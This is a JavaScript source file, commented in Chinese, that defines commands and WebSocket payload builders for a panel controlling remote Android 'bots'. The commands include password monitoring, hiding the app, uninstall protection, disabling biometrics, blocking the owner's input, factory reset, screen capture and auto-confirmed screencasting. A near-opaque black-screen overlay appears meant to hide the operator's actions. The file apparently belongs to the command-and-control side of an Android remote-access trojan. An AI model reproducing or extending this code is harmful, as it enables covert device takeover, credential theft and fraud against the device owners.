/**
 * 设备命令常量和工具
 * 对应后端 server.py 中 handle_command 处理的所有命令
 */

// ==================== 命令常量 ====================

export const COMMANDS = {
  // ── 屏幕控制 ──
  POWER_WAKE: 'POWER_WAKE',
  POWER_SLEEP: 'POWER_SLEEP',
  CAPTURE_SCREEN: 'CAPTURE_SCREEN',
  SCREENSHOT: 'screenshot',
  STOP_CAPTURE: 'STOP_CAPTURE',

  // ── 黑屏 ──
  ENABLE_BLACK_SCREEN: 'ENABLE_BLACK_SCREEN',
  DISABLE_BLACK_SCREEN: 'DISABLE_BLACK_SCREEN',

  // ── 投屏 ──
  SCREENCAST: 'SCREENCAST',
  SYSTEM_SCREENCAST: 'SYSTEM_SCREENCAST',
  STOP_SCREENCAST: 'STOP_SCREENCAST',
  SCREEN_CAPTURE_RESUME: 'SCREEN_CAPTURE_RESUME',

  // ── 导航 ──
  HOME: 'home',
  BACK: 'back',
  RECENTS: 'recents',

  // ── 输入 ──
  INPUT_TEXT: 'INPUT_TEXT',
  INPUT_PASSWORD: 'INPUT_PASSWORD',

  // ── 音量 ──
  VOLUME_UP: 'VOLUME_UP',
  VOLUME_DOWN: 'VOLUME_DOWN',
  MUTE: 'MUTE',
  SET_BRIGHTNESS: 'SET_BRIGHTNESS',

  // ── 解锁 ──
  UNLOCK_DEVICE: 'UNLOCK_DEVICE',
  SMART_NUMERIC_UNLOCK: 'SMART_NUMERIC_UNLOCK',
  SMART_PATTERN_UNLOCK: 'SMART_PATTERN_UNLOCK',
  SMART_SWIPE_UNLOCK: 'SMART_SWIPE_UNLOCK',
  ENABLE_PASSWORD_MONITORING: 'ENABLE_PASSWORD_MONITORING',
  DISABLE_PASSWORD_MONITORING: 'DISABLE_PASSWORD_MONITORING',

  // ── 设备控制 ──
  DEVICE_BLOCK_INPUT: 'DEVICE_BLOCK_INPUT',
  DEVICE_ALLOW_INPUT: 'DEVICE_ALLOW_INPUT',
  DEVICE_REBOOT: 'DEVICE_REBOOT',
  DEVICE_SHUTDOWN: 'DEVICE_SHUTDOWN',
  FACTORY_RESET: 'FACTORY_RESET',

  // ── 应用控制 ──
  HIDE_APP: 'HIDE_APP',
  SHOW_APP: 'SHOW_APP',
  ENABLE_UNINSTALL_PROTECTION: 'ENABLE_UNINSTALL_PROTECTION',
  DISABLE_UNINSTALL_PROTECTION: 'DISABLE_UNINSTALL_PROTECTION',
  UNINSTALL_APP: 'UNINSTALL_APP',
  DISABLE_BIOMETRIC: 'DISABLE_BIOMETRIC',

  // ── 日志控制 ──
  LOG_ENABLE: 'LOG_ENABLE',
  LOG_DISABLE: 'LOG_DISABLE',

  // ── 无障碍 ──
  ENABLE_ACCESSIBILITY: 'enableAccessibility',
  DISABLE_ACCESSIBILITY: 'disableAccessibility',
  GET_UI_HIERARCHY: 'GET_UI_HIERARCHY',

  // ── 服务器设置 ──
  SET_SERVER: 'SET_SERVER',

  // ── 通知 ──
  SHOW_NOTIFICATION: 'SHOW_NOTIFICATION',
  DISMISS_NOTIFICATION: 'DISMISS_NOTIFICATION',

  // ── 其他 ──
  LAUNCH_APP: 'LAUNCH_APP',
  OPEN_URL: 'OPEN_URL',
  VIBRATE: 'VIBRATE',
  WAKE_LOCK: 'WAKE_LOCK',
  SCREENSHOT_CAPTURE: 'SCREENSHOT_CAPTURE',
}

// ==================== 命令辅助函数 ====================

/**
 * 构建命令 payload
 */
export function buildCommandPayload(deviceId, command, params = {}) {
  return {
    type: 'command',
    sessionId: deviceId,
    deviceId: deviceId,
    data: {
      command,
      params,
    },
  }
}

/**
 * 构建控制命令 payload（带 control 字段，兼容旧版 APK）
 */
export function buildControlPayload(deviceId, command, controlType, params = {}) {
  const normalized = normalizeControlData(controlType, params)
  return {
    type: 'command',
    sessionId: deviceId,
    deviceId: deviceId,
    data: {
      command,
      type: controlType,
      params: normalized,
      control: {
        type: controlType,
        ...normalized,
      },
    },
  }
}

/**
 * 构建订阅 payload
 */
export function buildSubscribePayload(deviceId) {
  return { type: 'subscribe', sessionId: deviceId }
}

/**
 * 构建 ping payload
 */
export function buildPingPayload() {
  return { type: 'ping' }
}

/**
 * 构建获取 bot 列表 payload
 */
export function buildGetBotListPayload() {
  return { type: 'get_bot_list' }
}

/**
 * 构建截图请求 payload
 */
export function buildScreenshotPayload(deviceId, quality = 95, width = 1080, height = 2400) {
  return {
    type: 'command',
    sessionId: deviceId,
    deviceId: deviceId,
    data: {
      command: 'screenshot',
      params: { quality, width, height },
    },
  }
}

/**
 * 构建黑屏遮挡 payload
 */
export function buildBlackScreenPayload(deviceId, options = {}) {
  const { text = '', fontSize = 24, alpha = 252, showIcon = false, showProgress = false, style } = options
  const params = { text, fontSize, alpha, showIcon, showProgress }
  if (style) params.style = style

  return {
    type: 'command',
    sessionId: deviceId,
    deviceId: deviceId,
    data: {
      command: 'ENABLE_BLACK_SCREEN',
      params,
    },
  }
}

/**
 * 构建投屏命令 payload
 */
export function buildScreenCastPayload(deviceId, autoConfirm = true) {
  return {
    type: 'command',
    sessionId: deviceId,
    deviceId: deviceId,
    data: {
      command: 'SCREENCAST',
      params: { autoConfirm },
    },
  }
}

// ==================== 控制数据标准化 ====================

function normalizeControlData(type, params = {}) {
  const p = params && typeof params === 'object' && !Array.isArray(params)
    ? params
    : { value: params }

  if (type === 'swipe_path') {
    const startX = Math.round(p.startX ?? p.x1 ?? p.sx ?? 0)
    const startY = Math.round(p.startY ?? p.y1 ?? p.sy ?? 0)
    const endX = Math.round(p.endX ?? p.x2 ?? p.ex ?? 0)
    const endY = Math.round(p.endY ?? p.y2 ?? p.ey ?? 0)
    return {
      path: [
        { x: startX, y: startY },
        { x: Math.round((startX + endX) / 2), y: Math.round((startY + endY) / 2) },
        { x: endX, y: endY },
      ],
      startX, startY, endX, endY,
      duration: p.duration ?? 300,
    }
  }

  if (type === 'tap') {
    return { x: Math.round(p.x ?? 0), y: Math.round(p.y ?? 0) }
  }

  return p
}

// ==================== WebSocket 消息类型 ====================

export const WS_MESSAGE_TYPES = {
  // 发送
  COMMAND: 'command',
  SUBSCRIBE: 'subscribe',
  PING: 'ping',
  GET_BOT_LIST: 'get_bot_list',
  SCREENSHOT: 'screenshot',
  SCREEN_CAPTURE_RESUME: 'SCREEN_CAPTURE_RESUME',

  // 接收
  PONG: 'pong',
  BOT_LIST: 'bot_list',
  BOT_ONLINE: 'bot_online',
  BOT_OFFLINE: 'bot_offline',
  DEVICE_UPDATE: 'device_update',
  SCREENSHOT: 'screenshot',
  SCREEN: 'screen',
  FRAME: 'frame',
  READER_DATA: 'reader_data',
  ACCESSIBILITY_DATA: 'accessibility_data',
  UI_HIERARCHY: 'ui_hierarchy',
  ACCESSIBILITY_DUMP: 'accessibility_dump',
  ERROR: 'error',
}
